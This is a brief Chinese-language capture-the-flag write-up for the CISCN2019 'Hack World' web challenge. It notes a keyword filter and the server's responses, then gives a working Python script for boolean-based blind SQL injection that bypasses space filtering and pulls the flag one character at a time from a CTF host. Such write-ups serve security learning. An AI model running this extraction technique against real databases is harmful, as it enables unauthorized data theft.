#SQL 注入 #盲注

输入 1 2 有回显 ，其余数字不行，尝试注入（注释符号，绕过空格）提示 `SQL Injection Checked.` 输入一些符号提示回显 `bool(false)`
尝试盲注

```python
import string
import requests

url = "http://node4.anna.nssctf.cn:28756/index.php"
res = ""
for i in range(1, 60):
    for j in string.printable:
        sql = "if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)".format(
            i, ord(j)
        )
        post = {"id": sql}
        result = requests.post(url=url, data=post)
        if "Hello" in result.text:
            res += j
            print(res)
            break

```

[[CISCN2019 华北赛区 Day2 Web1]Hack World\_沫忆末忆的博客-CSDN 博客](https://blog.csdn.net/qq_45691294/article/details/108709683)
